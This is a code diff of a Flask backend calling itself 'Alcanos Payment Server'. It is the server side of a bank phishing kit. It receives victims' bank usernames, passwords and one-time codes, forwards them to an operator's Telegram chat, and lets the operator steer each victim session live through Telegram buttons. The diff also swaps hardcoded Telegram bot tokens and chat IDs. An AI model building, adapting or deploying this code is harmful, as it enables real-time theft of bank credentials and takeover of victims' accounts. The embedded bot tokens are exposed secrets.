@@ -3,30 +3,24 @@ import json
 import requests
 from datetime import datetime
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 from threading import Thread
 import time
 
 app = Flask(__name__)
+CORS(app)  # Habilitar CORS para todas las rutas
 
 # ══════════════════════════════════════════════════════════════
-# CONFIGURACIÓN - Cambiar estas variables en Render
+# CONFIGURACIÓN
 # ══════════════════════════════════════════════════════════════
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14')
-CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1002904816351')
+BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8578415094:AAFIbQglTSUmxX3IK4nQfuayvmQfDh-aYjM')
+CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003526160154')
 WEBHOOK_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
 
-# Base de datos en memoria (usar Redis en producción)
 sessions_db = {}
-
-# ══════════════════════════════════════════════════════════════
-# ENDPOINTS
-# ══════════════════════════════════════════════════════════════
 
 @app.route('/api/login', methods=['POST'])
 def login():
-    """
-    Recibe credenciales del cliente y las envía a Telegram
-    """
     try:
         data = request.json
         session_id = data.get('sessionId')
@@ -41,7 +35,6 @@ def login():
         if not session_id or not usuario or not clave:
             return jsonify({'error': 'Datos incompletos'}), 400
 
-        # Guardar sesión en memoria
         sessions_db[session_id] = {
             'bank': bank,
             'usuario': usuario,
@@ -56,7 +49,6 @@ def login():
             'otp_attempts': 0
         }
 
-        # Preparar mensaje para Telegram con botones
         message = f"""
 🏦 <b>CREDENCIALES — {bank}</b>
 ━━━━━━━━━━━━━━━━━
@@ -79,7 +71,6 @@ def login():
             ]
         ]
 
-        # Enviar a Telegram
         payload = {
             'chat_id': CHAT_ID,
             'text': message,
@@ -100,17 +91,12 @@ def login():
 
 @app.route('/api/session/<session_id>', methods=['GET'])
 def get_session(session_id):
-    """
-    Retorna el estado actual de la sesión
-    El cliente hace polling a este endpoint cada 1.5 segundos
-    """
     try:
         if session_id not in sessions_db:
             return jsonify({'error': 'Sesión no encontrada'}), 404
 
         session = sessions_db[session_id]
-
-        # Retornar estado actual
+        
         return jsonify({
             'status': session['status'],
             'message': session.get('message', ''),
@@ -124,9 +110,6 @@ def get_session(session_id):
 
 @app.route('/api/otp', methods=['POST'])
 def submit_otp():
-    """
-    Recibe el OTP del cliente
-    """
     try:
         data = request.json
         session_id = data.get('sessionId')
@@ -142,7 +125,6 @@ def submit_otp():
         session['otp'] = otp
         session['otp_attempts'] = session.get('otp_attempts', 0) + 1
 
-        # Enviar OTP a Telegram
         message = f"""
 🔐 <b>CÓDIGO OTP RECIBIDO — {session['bank']}</b>
 ━━━━━━━━━━━━━━━━━
@@ -182,12 +164,9 @@ def submit_otp():
 
 @app.route('/api/callback', methods=['POST'])
 def handle_callback():
-    """
-    Webhook para recibir respuestas de los botones de Telegram
-    """
     try:
         update = request.json
-
+        
         if 'callback_query' not in update:
             return jsonify({'ok': True}), 200
 
@@ -195,13 +174,11 @@ def handle_callback():
         callback_data = callback_query.get('data', '')
         callback_id = callback_query.get('id')
 
-        # Responder al callback
         requests.post(
             f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
             json={'callback_query_id': callback_id, 'text': 'Procesado'}
         )
 
-        # Procesar acciones
         if callback_data.startswith('action_otp_'):
             session_id = callback_data.replace('action_otp_', '').replace('action_otp_confirm_', '').replace('action_otp_reject_', '')
             if session_id in sessions_db:
@@ -239,10 +216,6 @@ def handle_callback():
 
 @app.route('/api/health', methods=['GET'])
 def health_check():
-    """
-    Endpoint para verificar que el servidor está activo
-    Usado por UptimeRobot o similar para mantener Render despierto
-    """
     return jsonify({
         'status': 'active',
         'timestamp': datetime.now().isoformat(),
@@ -252,9 +225,6 @@ def health_check():
 
 @app.route('/', methods=['GET'])
 def index():
-    """
-    Página de inicio
-    """
     return jsonify({
         'app': 'Alcanos Payment Server',
         'version': '1.0.0',
@@ -269,30 +239,19 @@ def index():
     }), 200
 
 
-# ══════════════════════════════════════════════════════════════
-# KEEP-ALIVE PARA RENDER
-# ══════════════════════════════════════════════════════════════
 def keep_alive():
-    """
-    Hace ping a sí mismo cada 10 minutos para que Render no duerma la app
-    """
     while True:
         try:
-            time.sleep(10 * 60)  # 10 minutos
+            time.sleep(10 * 60)
             requests.get(f'http://localhost:5000/api/health', timeout=5)
             print(f'[KEEP-ALIVE] Ping a las {datetime.now().strftime("%H:%M:%S")}')
         except Exception as e:
             print(f'[KEEP-ALIVE] Error: {str(e)}')
 
 
-# ══════════════════════════════════════════════════════════════
-# MAIN
-# ══════════════════════════════════════════════════════════════
 if __name__ == '__main__':
-    # Iniciar thread de keep-alive
     keep_alive_thread = Thread(target=keep_alive, daemon=True)
     keep_alive_thread.start()
 
-    # Puerto desde Render o localhost:5000
     port = int(os.getenv('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
